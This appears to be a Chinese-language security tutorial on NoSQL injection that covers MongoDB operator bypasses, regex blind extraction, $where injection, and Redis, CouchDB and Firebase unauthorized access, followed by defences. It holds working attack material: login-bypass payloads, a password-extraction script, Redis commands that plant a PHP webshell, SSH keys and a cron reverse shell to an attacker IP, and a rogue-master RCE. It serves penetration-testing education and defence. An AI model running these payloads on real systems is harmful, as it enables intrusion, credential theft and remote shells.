# 🍃 NoSQL 注入全技巧

> **OWASP Top 10 2021 — A03: Injection（注入）**
> **NoSQL 注入**是针对 MongoDB、Redis、CouchDB 等非关系型数据库的注入攻击。与传统 SQL 注入不同，NoSQL 注入利用的是**查询语法**而非 SQL 语句。
> 关联：[SQL注入全技巧](09-sql-injection.md) | [命令注入全技巧](11-command-injection.md) | [XSS全技巧](12-xss.md) | [模板注入SSTI全技巧](17-ssti.md)

---

## 📖 一、NoSQL 注入基础原理

### 1.1 什么是 NoSQL 注入？

NoSQL 数据库不使用 SQL 语言，而是使用各种 API 或 JSON 格式进行查询。攻击者通过**构造特殊数据格式**（如操作符 `$gt`、`$ne`、`$regex`）来绕过认证或操纵查询逻辑。

**与传统 SQL 注入的区别：**

| 对比项 | SQL 注入 | NoSQL 注入 |
|:---|:---|:---|
| **查询语言** | SQL（结构化查询语句） | API 调用 / JSON 文档 / 键值对 |
| **注入方式** | 字符串拼接 | 修改 JSON 结构 / 注入操作符 |
| **常用数据库** | MySQL, PostgreSQL, Oracle | MongoDB, Redis, CouchDB, Firebase |
| **常见场景** | 登录绕过、数据泄露 | 登录绕过、权限提升、数据泄露 |
| **利用难度** | 工具多、Payload 成熟 | 需要理解 NoSQL 查询语法 |

### 1.2 常见 NoSQL 数据库

| 数据库 | 类型 | 查询方式 | 特点 |
|:---|:---|:---|:---|
| **MongoDB** | 文档型 | JSON / BSON | 最流行，使用 `$` 操作符 |
| **Redis** | 键值型 | 命令集 | 缓存之王，未授权访问常见 |
| **CouchDB** | 文档型 | HTTP API + JSON | RESTful API |
| **Firebase** | 实时数据库 | REST API + JSON | Google 云服务 |
| **DynamoDB** | 键值/文档 | AWS API | 云原生 NoSQL |
| **Elasticsearch** | 搜索引擎 | REST API + JSON DSL | 数据搜索与分析 |

### 1.3 危害

- 认证绕过（登录无需密码）
- 未授权数据访问（越权查看他人数据）
- 数据篡改（修改/删除数据）
- 拒绝服务（构造复杂查询耗尽资源）
- 在某些配置下可实现 **RCE**

---

## 🏷️ 二、MongoDB 注入

### 2.1 MongoDB 查询基础

MongoDB 使用 JSON/BSON 格式进行查询，支持多种操作符：

```javascript
// MongoDB 查询示例
db.users.find({username: "admin", password: "123456"})

// 使用操作符
db.users.find({username: "admin", password: {$ne: ""}})
// 查找 username=admin 且 password 不为空 → 返回所有匹配文档

// 常用操作符
$eq   // 等于 (equal)
$ne   // 不等于 (not equal)
$gt   // 大于 (greater than)
$gte  // 大于等于
$lt   // 小于 (less than)
$lte  // 小于等于
$in   // 在列表中
$nin  // 不在列表中
$regex // 正则表达式匹配
$where // JavaScript 表达式（危险！可导致注入）
$exists // 字段是否存在
```

### 2.2 认证绕过（最经典）

**漏洞代码（Node.js + MongoDB）：**

```javascript
// ❌ 危险代码：直接拼接用户输入
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // 危险：直接将用户输入作为查询条件
    db.users.find({
        username: username,
        password: password
    }).toArray((err, result) => {
        if (result.length > 0) {
            res.send("登录成功！");
        } else {
            res.send("登录失败！");
        }
    });
});
```

**正常请求（JSON）：**
```json
{"username": "admin", "password": "123456"}
```

**注入 Payload（认证绕过）：**
```json
// 绕过方式 1：使用 $ne 匹配任意非空密码
{"username": "admin", "password": {"$ne": ""}}

// 绕过方式 2：使用 $gt 匹配大于空字符串的密码
{"username": "admin", "password": {"$gt": ""}}

// 绕过方式 3：使用 $regex 匹配任意密码
{"username": "admin", "password": {"$regex": ".*"}}

// 绕过方式 4：不存在的用户？用 $ne 也绕过
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### 2.3 URL 编码格式注入

当数据通过 URL 参数（查询字符串或表单）传递时：

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=
```

PHP 会将其解析为数组：
```php
// PHP 解析后
['username' => 'admin', 'password' => ['$ne' => '']]
```

**PHP MongoDB 注入示例：**
```php
<?php
// ❌ 危险代码
$username = $_POST['username'];
$password = $_POST['password'];

$filter = [
    'username' => $username,
    'password' => $password
];
$result = $collection->findOne($filter);

// 如果 $password 是 ['$ne' => '']，查询变为：
// db.users.findOne({username: "admin", password: {$ne: ""}})
// ✅ 认证绕过成功！
?>
```

### 2.4 $regex 盲注

```javascript
// 逐字符猜解密码
// 测试密码是否以 a 开头
{"username": "admin", "password": {"$regex": "^a"}}
// 如果返回登录成功 → 密码以 a 开头

// 测试密码是否以 ad 开头
{"username": "admin", "password": {"$regex": "^ad"}}
// 如果返回登录成功 → 密码以 ad 开头

// 完整盲注脚本
const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
let password = '';

for (let i = 0; i < 32; i++) {  // 假设密码长度最多32
    for (const c of chars) {
        const payload = {
            username: "admin",
            password: {"$regex": `^${password}${c}`}
        };
        const res = await fetch('/login', {
            method: 'POST',
            body: JSON.stringify(payload),
            headers: {'Content-Type': 'application/json'}
        });
        if (res.ok) {
            password += c;
            console.log(`Found: ${password}`);
            break;
        }
    }
}
```

### 2.5 $where 注入（RCE 风险）

`$where` 操作符允许传入 **JavaScript 表达式**，如果用户输入拼接到 `$where` 中，可导致 JavaScript 注入。

```javascript
// ❌ 危险代码
// 用户输入被直接拼接到 $where 中
db.users.find({$where: "this.username === '" + userInput + "'"});

// 正常输入：admin
// 查询：{$where: "this.username === 'admin'"}

// 注入 Payload
// 输入：admin' && this.password[0]=='a' && '1'=='1
// 查询：{$where: "this.username === 'admin' && this.password[0]=='a' && '1'=='1'"}
// 可进行盲注

// RCE Payload（如果 MongoDB 服务端允许）
// 输入：1'; return '1'; while(true){};'
// 可导致 DoS

// 注意：较新版本的 MongoDB 已限制 $where 的功能
```

**$where 时间盲注：**
```javascript
// 时间盲注检测
// 注入：' && sleep(5000) && '
// 注意：MongoDB 原生没有 sleep 函数
// 但可以使用循环消耗 CPU：
// ' && (function(){var d=new Date();while(new Date()-d<5000){}})()

// 或使用 MapReduce
```

### 2.6 HTTP 参数污染（HPP）

```http
# 当后端解析多个同名参数时
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&username[$gt]=&password=test

# Express + body-parser 可能解析为：
# { username: ['admin', {'$gt': ''}], password: 'test' }
# 或者 mongoose 处理为 username 被覆盖
```

### 2.7 NoSQL 注入工具

```bash
# NoSQLMap - 专门针对 NoSQL 的注入工具
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py

# Nosqli - Go 编写的 NoSQL 注入检测工具
nosqli -u "http://target.com/login" -c '{"username":"admin","password":{"$ne":""}}'

# 手动测试 Burp Suite + Custom Payloads
```

---

## 🏷️ 三、Redis 注入与未授权访问

### 3.1 Redis 未授权访问

Redis 默认**无密码认证**，如果绑定在 0.0.0.0 且未配置 requirepass，攻击者可直接连接。

```bash
# 检测未授权 Redis
redis-cli -h target.com -p 6379
redis-cli -h target.com -p 6379 info
redis-cli -h target.com -p 6379 keys *

# 如果不需要密码就能执行 info/keys 命令 → 未授权访问
```

### 3.2 Redis 利用 — 写 SSH 密钥

```bash
# 利用 Redis 写 SSH 公钥（获得 Shell）
redis-cli -h target.com -p 6379
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker\n\n"
> save

# 然后使用私钥 SSH 登录
ssh -i id_rsa root@target.com
```

### 3.3 Redis 利用 — 写 Webshell

```bash
# 写 PHP Webshell
redis-cli -h target.com -p 6379
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php system($_GET['cmd']);?>"
> save

# 访问 http://target.com/shell.php?cmd=id
```

### 3.4 Redis 利用 — 计划任务反弹 Shell

```bash
# 写 crontab 反弹 Shell（需要 Redis 能写 /var/spool/cron/）
redis-cli -h target.com -p 6379
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n\n* * * * * bash -i >& /dev/tcp/your-ip/4444 0>&1\n\n"
> save

# MySQL + Redis 组合利用
# 如果目标同时使用 MySQL 和 Redis，可通过 SQL 注入操控 Redis
```

### 3.5 Redis 主从复制 RCE

```bash
# 利用 Redis 4.x/5.x 主从复制模块加载 RCE
# 使用项目：https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

# 攻击机启动恶意 Redis 服务器
python3 redis_rogue_server.py -v -path modules/

# 目标机连接恶意服务器加载模块
redis-cli -h target.com -p 6379
> SLAVEOF your-ip 21000
> CONFIG SET dir /tmp/
> CONFIG SET dbfilename exploit.so
> SLAVEOF NO ONE
> MODULE LOAD /tmp/exploit.so
> system.exec "id"
> system.exec "whoami"
```

---

## 🏷️ 四、CouchDB 注入

### 4.1 CouchDB 未授权访问

```bash
# CouchDB 默认端口 5984
curl http://target.com:5984/
# 响应：{"couchdb":"Welcome","version":"2.3.1"}

# 获取所有数据库列表
curl http://target.com:5984/_all_dbs

# 获取指定数据库所有文档
curl http://target.com:5984/users/_all_docs?include_docs=true
```

### 4.2 CouchDB JSON 注入

```javascript
// CouchDB 查询使用 JavaScript（视图函数）
// 如果用户输入被拼接到视图函数中，可实现注入

// 设计文档中的视图函数
function(doc) {
    if (doc.type === 'user' && doc.username === '用户输入') {
        emit(doc.username, doc.password);
    }
}

// 注入 Payload
// 输入：admin' || '1'=='1
// 函数变为：
function(doc) {
    if (doc.type === 'user' && doc.username === 'admin' || '1'=='1') {
        emit(doc.username, doc.password);
    }
}
// ✅ 返回所有用户的数据！
```

---

## 🏷️ 五、Firebase 注入

### 5.1 Firebase 未安全配置

```javascript
// Firebase 实时数据库如果规则配置不当
// 如：{".read": true, ".write": true}
// 攻击者可以直接访问所有数据

// 检测 Firebase 可读性
fetch('https://your-project.firebaseio.com/.json')
  .then(r => r.json())
  .then(d => console.log(d))

// 如果返回 JSON 数据 → 未授权访问

// 深度遍历
fetch('https://your-project.firebaseio.com/users.json')
fetch('https://your-project.firebaseio.com/admin.json')
```

---

## 🚀 六、进阶利用技巧

### 6.1 NoSQL 布尔盲注

```javascript
// MongoDB 布尔盲注
// 通过登录成功/失败的响应差异来猜解数据

// 测试用户是否存在
{"username": "admin", "password": {"$regex": ".*"}}  → 登录成功
{"username": "nonexist", "password": {"$regex": ".*"}} → 登录失败

// 测试密码长度
{"username": "admin", "password": {"$regex": ".{5}"}}  → 5位以上？
{"username": "admin", "password": {"$regex": ".{10}"}} → 10位以上？

// 逐字符猜解
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
// ...
```

### 6.2 NoSQL 时间盲注

```javascript
// 利用 $where 的 CPU 消耗延时
{"username": "admin", 
 "password": {
   "$where": "(function(){var d=new Date();while(new Date()-d<5000){}})(),'"
 }}

// 结合条件判断
{"username": "admin",
 "$where": "if(this.password[0]=='a'){var d=new Date();while(new Date()-d<5000){}}"
}}
```

### 6.3 Elasticsearch 注入

```json
// Elasticsearch 查询 DSL 注入
// 正常查询
GET /users/_search
{
  "query": {
    "match": {
      "username": "admin"
    }
  }
}

// 注入：利用布尔查询绕过认证
GET /users/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"username": "admin"}},
        {"match": {"password": "test"}}
      ]
    }
  }
}

// 注入为：
{"match": {"password": "test"}}
// 改为：
{"match": {"_index": {"$gt": ""}}}
```

### 6.4 GraphQL + NoSQL 组合

```graphql
// GraphQL 接口 + MongoDB 组合
// 如果后端使用 MongoDB 的 $ 操作符直接拼接到查询中

mutation {
  login(username: "admin", password: "{\"$ne\": \"\"}") {
    token
    role
  }
}
```

### 6.5 NoSQL 数据批量导出

```javascript
// MongoDB 的 $where 注入遍历数据
// 利用 $regex 批量导出
db.users.find({
  $where: "this.role == 'admin'"
}).forEach(function(user) {
  // 外带到攻击者服务器
  print(user.username + ":" + user.password);
});
```

---

## 🛡️ 七、防御方案

### 7.1 MongoDB 安全开发

```javascript
// Node.js + MongoDB 安全写法

// ❌ 危险：直接传入对象
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    // 如果 password 是 {"$ne": ""}，则被 MongoDB 解析为操作符
    const user = await db.collection('users').findOne({
        username: username,
        password: password  // ❌ 危险！
    });
    // ...
});

// ✅ 安全：类型校验 + 显式字段
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // 1. 确保输入是字符串（不是对象）
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).send("无效的输入类型");
    }
    
    // 2. 使用预定义的查询条件（不直接传入）
    const user = await db.collection('users').findOne({
        username: username,
        password: password  // 此时一定是字符串，不会被解析为操作符
    });
    // ...
});
```

### 7.2 PHP MongoDB 安全写法

```php
<?php
// ✅ 安全：使用类型转换
$username = (string) $_POST['username'];  // 强制转换为字符串
$password = (string) $_POST['password'];

// ✅ 安全：使用明文密码哈希比较
$user = $collection->findOne(['username' => $username]);
if ($user && password_verify($password, $user['password'])) {
    // 登录成功
}

// ✅ 安全：使用 MongoDB PHP 驱动 1.6+ 的类型映射
$options = [
    'typeMap' => ['root' => 'array', 'document' => 'array']
];
$user = $collection->findOne(
    ['username' => $username],
    $options
);
```

### 7.3 Redis 安全配置

```bash
# redis.conf 安全配置

# 1. 绑定回环地址（不暴露外网）
bind 127.0.0.1

# 2. 设置密码
requirepass VeryStrongPassword123!

# 3. 禁用危险命令
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command EVAL ""
rename-command SCRIPT ""

# 4. 以非 root 用户运行
# 在启动命令中：sudo -u redis redis-server /etc/redis/redis.conf
```

### 7.4 Firebase 安全规则

```json
// Firebase 数据库规则安全配置
{
  "rules": {
    "users": {
      "$uid": {
        // 只允许用户读写自己的数据
        ".read": "auth != null && auth.uid === $uid",
        ".write": "auth != null && auth.uid === $uid"
      }
    },
    "admin": {
      // 仅管理员可访问
      ".read": "auth != null && auth.token.isAdmin === true",
      ".write": "auth != null && auth.token.isAdmin === true"
    },
    // 禁止通配符读取
    ".read": false,
    ".write": false
  }
}
```

### 7.5 通用防御原则

| 措施 | 说明 |
|:---|:---|
| ✅ **输入类型校验** | 强制字符串类型，拒绝对象/数组输入 |
| ✅ **参数化查询** | 使用预定义查询参数，不直接拼接 |
| ✅ **最小权限** | 数据库账户只给最低必要权限 |
| ✅ **网络隔离** | 数据库不暴露公网，仅内网访问 |
| ✅ **输入验证** | 过滤 `$`、`{`、`}` 等特殊字符 |
| ✅ **ORM/ODM** | 使用 Mongoose 等 ODM 工具（提供额外安全层） |
| ✅ **审计日志** | 记录所有数据库查询异常 |

---

## 🎯 八、检测流程速查

### 8.1 测试 Checklist

- [ ] 是否使用 JSON/对象作为查询参数？
- [ ] 测试 `{"$ne": ""}` 绕过登录
- [ ] 测试 `{"$gt": ""}` 绕过登录
- [ ] 测试 `{"$regex": ".*"}` 绕过登录
- [ ] 测试 URL 编码格式：`password[$ne]=`
- [ ] 测试 `$where` 注入
- [ ] 测试 HTTP 参数污染
- [ ] 测试 Redis 未授权访问（端口 6379）
- [ ] 测试 CouchDB 未授权访问（端口 5984）
- [ ] 测试 Firebase 数据库公开读取
- [ ] 测试 Elasticsearch 未授权访问

### 8.2 常用 Payload 速查

```json
// MongoDB 认证绕过
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$in": ["", "admin", "123456"]}}
{"username": "admin", "password": {"$exists": true}}

// MongoDB 盲注
{"username": "admin", "password": {"$regex": "^[a-z]"}}


// URL 编码格式
username=admin&password[$regex]=.*
username[$gt]=&password[$gt]=
```

### 8.3 推荐工具

| 工具 | 用途 |
|:---|:---|
| **NoSQLMap** | 自动化 NoSQL 注入检测与利用 |
| **Nosqli** | Go 语言 NoSQL 注入工具 |
| **redis-cli** | Redis 命令行（手动测试） |
| **Burp Suite** | 手工测试与 Intruder 模糊测试 |
| **nuclei** | 模板化漏洞扫描 |

---

## 🔗 关联文件

| 文件 | 关联说明 |
|:---|:---|
| [SQL注入全技巧](09-sql-injection.md) | 传统 SQL 注入对比学习 |
| [命令注入全技巧](11-command-injection.md) | 另一类注入漏洞 |
| [XSS全技巧](12-xss.md) | 同属 A03 Injection 大类 |
| [反序列化注入全技巧](18-deserialization.md) | Redis 反序列化利用 |
| [安全配置错误（A05）全技巧](24-a05-security-misconfiguration.md) | Redis/CouchDB 未授权访问 |

> **💡 核心原则**：NoSQL 注入利用的是 **查询操作符**（如 `$ne`、`$regex`）而非 SQL 语法。防御的关键是 **强制输入类型为字符串** 并 **预定义查询条件**，不让用户直接控制查询的结构！
